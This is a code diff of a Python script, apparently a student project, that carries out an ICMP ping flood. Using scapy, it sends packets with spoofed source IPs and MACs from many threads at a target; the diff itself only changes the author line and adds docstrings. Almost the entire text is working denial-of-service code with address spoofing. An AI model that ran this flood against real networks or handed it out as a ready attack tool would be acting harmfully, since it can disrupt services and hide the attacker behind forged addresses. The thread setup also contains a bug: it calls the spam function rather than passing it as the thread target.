@@ -1,7 +1,7 @@
 '''
 A program that performs Ping spam attacks by flooding
 
-Author: Raz Crimson
+Author: Bharath Vignesh J K(19PW08)
 '''
 import time
 import sys
@@ -16,6 +16,7 @@ from scapy.volatile import RandIP, RandMAC
 PING_SPAM_DURATION = 100
 
 class PingSpammer:
+    '''A class that represents the Ping Spammer'''
 
     def __init__(self, dst: str, spam_duration, *, subnet_bits=24, thread_count=20):
         self.dst = dst
@@ -25,9 +26,11 @@ class PingSpammer:
         self.__threads = []
                 
     def __generate_packet(self):
+        '''Generates the Ping packet. IP Addresses are randomized in the destination's subnet range'''
         return Ether(src=RandMAC())/IP(src=RandIP(f"{self.dst}/{self.subnet_bits}"), dst=self.dst)/ICMP()/("Hello, I am bored" * 10)
         
     def spam_pings(self, timeout=100):
+        '''The spammer function that sends the generated packets'''
         start_time = time.time()
         while time.time() - start_time < timeout:
             pkt = self.__generate_packet()
@@ -35,6 +38,7 @@ class PingSpammer:
             sendp(pkt, verbose=False)
         
     def __generate_threads(self):
+        '''function that generated the threads with the spammer function and starts them'''
         for _ in range(self.__thread_count):
             thread = Thread(target=self.spam_pings(), args=(self.__spam_duartion,), daemon=True)
             thread.start()
